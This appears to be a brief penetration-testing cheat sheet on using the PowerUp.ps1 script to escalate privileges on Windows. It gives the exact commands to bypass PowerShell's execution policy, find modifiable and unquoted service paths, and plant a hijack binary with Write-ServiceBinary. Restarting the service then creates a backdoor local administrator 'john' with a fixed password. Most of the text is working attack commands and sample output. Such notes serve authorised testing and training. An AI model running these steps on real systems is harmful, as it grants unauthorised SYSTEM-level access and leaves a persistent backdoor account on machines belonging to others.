
---

Is an tool which automatically detects Priv Esc vectors for binary hijacking.

## Syntax

```
powershell -ep bypass
```

Execute it

```
. .\PowerUp.ps1
```

Now we can use "Get-ModifiableServiceFile".

This function displays services the current user can modify, such as the service binary or configuration files.

```
Get-ModifiableServiceFile
```

## Unquoted Service Path

Checks for vulnerable unquoted service paths.

```
Get-UnquotedService
ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService

ServiceName    : GammaService
Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
CanRestart     : True
Name           : GammaService
```

Let's use the AbuseFunction and restart the service to attempt to elevate our privileges. For -Path, we enter the same path for Current.exe.

The default behavior is to create a new local user called john with the password Password123!

We don't even have to create an malicious .c script ourself!

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

Executing binary.

```
Restart-Service GammaService
```